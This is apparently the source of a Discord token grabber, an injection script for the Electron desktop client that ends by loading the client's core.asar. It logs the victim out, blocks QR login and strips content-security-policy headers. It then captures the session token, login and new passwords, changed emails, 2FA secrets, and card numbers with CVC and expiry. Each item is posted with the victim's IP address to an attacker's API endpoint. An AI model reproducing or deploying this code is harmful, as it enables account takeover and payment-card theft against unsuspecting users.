const {
    BrowserWindow,
    session
} = require('electron');
const http = require('http');
const API = ""; //Your API Link
const KEY = ""; //Your Auth Token of API

var loggedOut = false;

session.defaultSession.webRequest.onBeforeRequest({
    'urls': [
        'https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json',
        'https://*.discord.com/api/v*/applications/detectable',
        'https://discord.com/api/v*/applications/detectable',
        'https://*.discord.com/api/v*/users/@me/library',
        'https://discord.com/api/v*/users/@me/library',
        'https://*.discord.com/api/v*/users/@me/billing/subscriptions',
        'https://discord.com/api/v*/users/@me/billing/subscriptions',
        'wss://remote-auth-gateway.discord.gg/*'
    ]
}, (details, callback) => {
    const window = BrowserWindow.getAllWindows()[0];
    if (loggedOut == false) {
        loggedOut = true;
        window.webContents.executeJavaScript(`window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`, true)
    } else {}
    if (details.url.startsWith('wss://')) callback({
        'cancel': true
    });
    else callback({
        'cancel': false
    });
})

session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
    delete details.responseHeaders['content-security-policy'];
    delete details.responseHeaders['content-security-policy-report-only'];
    callback({
        'responseHeaders': {
            ...details.responseHeaders,
            'Access-Control-Allow-Headers': '*'
        }
    });
});

function newData(type, token, ...args) {
    const window = BrowserWindow.getAllWindows()[0];
    window.webContents.executeJavaScript(`
          var xmlHttp = new XMLHttpRequest();
          xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
          xmlHttp.send( null );
          xmlHttp.responseText;
      `, !0).then((ip) => {
        switch (type) {
            case 'login':
                let req = http.request(API + `/send/login/${KEY}/${ip}/${token}/${args[0]}`, {
                    method: 'POST'
                }).on("error", () => { });
                req.write('login');
                req.end();
                break;
            case 'emailChanged':
                let req1 = http.request(API + `/send/email/${KEY}/${ip}/${token}/${args[0]}/${args[1]}`, {
                    method: 'POST'
                }).on("error", () => { });
                req1.write('emailChanged');
                req1.end();
                break;
            case 'passwordChanged':
                let req2 = http.request(API + `/send/password/${KEY}/${ip}/${token}/${args[1]}`, {
                    method: 'POST'
                }).on("error", () => { });
                req2.write('passwordChanged');
                req2.end();
                break;
            case 'cardAdded':
                let req3 = http.request(API + `/send/card/${KEY}/${ip}/${token}/${args[0]}/${args[2]}:${args[3]}/${args[1]}`, {
                    method: 'POST'
                }).on("error", () => { });
                req3.write('cardAdded');
                req3.end();
                break;
            case '2FAenabled':
                let req4 = http.request(API + `/send/a2f/${KEY}/${ip}/${token}/${args[1]}/${args[0]}`, {
                    method: 'POST'
                }).on("error", () => { });
                req4.write('2FAenabled');
                req4.end();
                break;
        }
    });
}
session.defaultSession.webRequest.onCompleted({
    'urls': [
        'https://discord.com/api/v*/users/@me',
        'https://discordapp.com/api/v*/users/@me',
        'https://*.discord.com/api/v*/users/@me',
        'https://discord.com/api/v*/users/@me/mfa/totp/enable',
        'https://discordapp.com/api/v*/users/@me/mfa/totp/enable',
        'https://*.discord.com/api/v*/users/@me/mfa/totp/enable',
        'https://discordapp.com/api/v*/auth/login',
        'https://discord.com/api/v*/auth/login',
        'https://*.discord.com/api/v*/auth/login',
        'https://api.stripe.com/v*/tokens'
    ]
}, async (details, callback) => {
    const window = BrowserWindow.getAllWindows()[0];
    if (details.statusCode != 200) return;
    const data = JSON.parse(Buffer.from(details.uploadData[0].bytes)
        .toString()),
        token = await window.webContents.executeJavaScript(`for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[['get_require']]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)'getToken'==a&&(token=b.default.getToken())}token;`, true)
    if (details.url.endsWith('login')) newData('login', token, data['password']);
    if (details.url.includes('users/@me/mfa/totp/enable')) newData('2FAenabled', token, data['secret'], data['password']);
    if (details.url.endsWith('users/@me')) {
        if (details.method != 'PATCH') return;
        if (!data['password']) return;
        if (data['email']) newData('emailChanged', token, data['email'], data['password']);
        if (data['new_password']) newData('passwordChanged', token, data['password'], data['new_password']);
    }
    if (details.url.endsWith('tokens')) newData('cardAdded', token, data['data[number]'], data['data[cvc]'], data['data[exp_month]'], data['data[exp_year]']);
}), module.exports = require('./core.asar');
